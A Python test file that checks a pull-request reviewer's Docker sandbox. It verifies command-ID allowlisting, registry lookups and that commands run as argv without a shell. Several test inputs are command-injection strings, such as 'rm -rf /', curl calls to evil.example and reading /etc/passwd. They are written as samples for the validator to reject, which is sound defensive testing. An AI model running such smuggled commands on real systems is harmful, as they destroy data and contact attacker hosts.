"""Task 35.A7: real command IDs on the same unweakened allowlist guarantee.

An ID not on the policy allowlist must raise ValueError at construction, not merely
be absent from DEFAULT_COMMANDS. verify_finding only checks the registry after Docker
is ready, so a missing-Docker runtime would return inconclusive and hide the refusal.
SandboxJob keeps exactly one field, command_id, with extra=forbid.
"""

from __future__ import annotations

import dataclasses
from collections.abc import Sequence
from typing import Any

import pytest
from pydantic import ValidationError

from pr_reviewer.contracts.finding_candidate import FindingCandidate
from pr_reviewer.github.pull_request import PullRequestFile, PullRequestSnapshot

BUSYBOX = "busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662"
HEAD = "a" * 40
PATCH = "@@ -1,2 +1,3 @@\n context\n+added line\n keep\n"


@dataclasses.dataclass(frozen=True)
class _ScriptedResult:
    returncode: int
    stdout: str = ""
    stderr: str = ""


class ScriptedCommandRunner:
    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []
        self._scripts: list[tuple[str, _ScriptedResult]] = []

    def when(
        self, contains: str, *, returncode: int = 0, stdout: str = "", stderr: str = ""
    ) -> None:
        self._scripts.append((contains, _ScriptedResult(returncode, stdout, stderr)))

    def run(self, args: Sequence[str], *, timeout: float) -> _ScriptedResult:
        del timeout
        argv = tuple(args)
        self.calls.append(argv)
        joined = " ".join(argv)
        for marker, result in self._scripts:
            if marker in joined:
                return result
        raise AssertionError(f"unscripted command: {argv}")


def _candidate() -> FindingCandidate:
    return FindingCandidate.model_validate(
        {
            "concern": "correctness",
            "severity": "medium",
            "category": "null-check",
            "file_path": "src/widget.py",
            "line_start": 2,
            "line_end": 2,
            "title": "Missing null check",
            "rationale": "widget.value can be None.",
            "evidence": ["src/widget.py:2"],
            "confidence": 0.8,
        }
    )


def _snapshot() -> PullRequestSnapshot:
    return PullRequestSnapshot.model_validate(
        {
            "repo_owner": "acme",
            "repo_name": "widgets",
            "number": 12,
            "base_sha": "c" * 40,
            "head_sha": HEAD,
            "title": "Add widget",
            "body": "",
            "files": [PullRequestFile(path="src/widget.py", status="modified", patch=PATCH)],
        }
    )


def _policy(**overrides: object) -> Any:
    from pr_reviewer.verification.docker_sandbox import VerificationPolicy

    fields: dict[str, object] = {
        "image_digest": BUSYBOX,
        "allowed_command_ids": frozenset({"run_pytest", "run_tsc", "run_ruff"}),
        "required_head_sha": HEAD,
        "command_id": "run_pytest",
    }
    fields.update(overrides)
    return VerificationPolicy(**fields)  # type: ignore[arg-type]


def _docker_ready_runtime(runner: ScriptedCommandRunner) -> Any:
    from pr_reviewer.containers.docker import DockerRuntime

    runner.when("docker version", returncode=0, stdout="29.2.1\n")
    runner.when("docker pull", returncode=0)
    runner.when("id -u", returncode=0, stdout="65532\n")
    runner.when("wget", returncode=1, stderr="timed out")
    runner.when("docker run", returncode=0, stdout="ok")
    runner.when("docker rm", returncode=0)
    return DockerRuntime(command_runner=runner, platform_reader=lambda: ("Linux", "x86_64"))


def test_run_pytest_run_tsc_and_run_ruff_are_registered_by_default() -> None:
    from pr_reviewer.verification.docker_sandbox import DEFAULT_COMMANDS

    assert DEFAULT_COMMANDS["run_pytest"] == ("pytest", "-q")
    assert DEFAULT_COMMANDS["run_tsc"] == ("tsc", "--noEmit")
    assert DEFAULT_COMMANDS["run_ruff"] == ("ruff", "check", ".")


def test_a_command_id_not_on_the_allowlist_raises_value_error() -> None:
    with pytest.raises(ValueError, match="not allowlisted"):
        _policy(allowed_command_ids=frozenset({"run_pytest"}), command_id="run_ruff")


def test_an_allowlisted_id_missing_from_the_registry_raises_value_error() -> None:
    from pr_reviewer.verification.docker_sandbox import verify_finding

    runner = ScriptedCommandRunner()
    runtime = _docker_ready_runtime(runner)
    with pytest.raises(ValueError, match="has no argv"):
        verify_finding(
            _candidate(),
            _snapshot(),
            _policy(
                allowed_command_ids=frozenset({"run_pytest", "run_pylint"}),
                command_id="run_pylint",
            ),
            runtime=runtime,
            commands={},
        )


@pytest.mark.parametrize(
    "smuggled",
    [
        "run_pytest; rm -rf /",
        "run_pytest && curl http://evil.example",
        "run_pytest -k evil",
        "run_ruff --config=/etc/passwd",
        "",
        "RUN_PYTEST",
        "run_pytest ",
    ],
)
def test_sandbox_job_rejects_a_command_id_carrying_smuggled_arguments(smuggled: str) -> None:
    from pr_reviewer.verification.docker_sandbox import SandboxJob

    with pytest.raises(ValidationError):
        SandboxJob(command_id=smuggled)


def test_sandbox_job_extra_fields_cannot_smuggle_arguments() -> None:
    from pr_reviewer.verification.docker_sandbox import SandboxJob

    with pytest.raises(ValidationError):
        SandboxJob(command_id="run_pytest", args=["--maxfail=1"])  # type: ignore[call-arg]
    with pytest.raises(ValidationError):
        SandboxJob(command_id="run_ruff", command="ruff check . && curl evil.example")  # type: ignore[call-arg]
    job = SandboxJob(command_id="run_pytest")
    assert not hasattr(job, "args")
    assert not hasattr(job, "command")


def test_real_command_argv_reaches_docker_run_without_shell_composition() -> None:
    from pr_reviewer.verification.docker_sandbox import verify_finding

    for command_id, expected_tail in (
        ("run_pytest", ("pytest", "-q")),
        ("run_tsc", ("tsc", "--noEmit")),
        ("run_ruff", ("ruff", "check", ".")),
    ):
        runner = ScriptedCommandRunner()
        runner.when("pytest -q", returncode=0, stdout="3 passed")
        runner.when("tsc --noEmit", returncode=0)
        runner.when("ruff check .", returncode=0)
        runtime = _docker_ready_runtime(runner)
        result = verify_finding(
            _candidate(),
            _snapshot(),
            _policy(command_id=command_id),
            runtime=runtime,
        )
        assert result.status == "passed"

        run_calls = [
            call
            for call in runner.calls
            if len(call) > 1 and call[1] == "run" and "--network" in call
        ]
        assert run_calls
        call = run_calls[-1]
        assert call[-len(expected_tail) :] == expected_tail
        assert "/bin/sh" not in call
        assert "-c" not in call
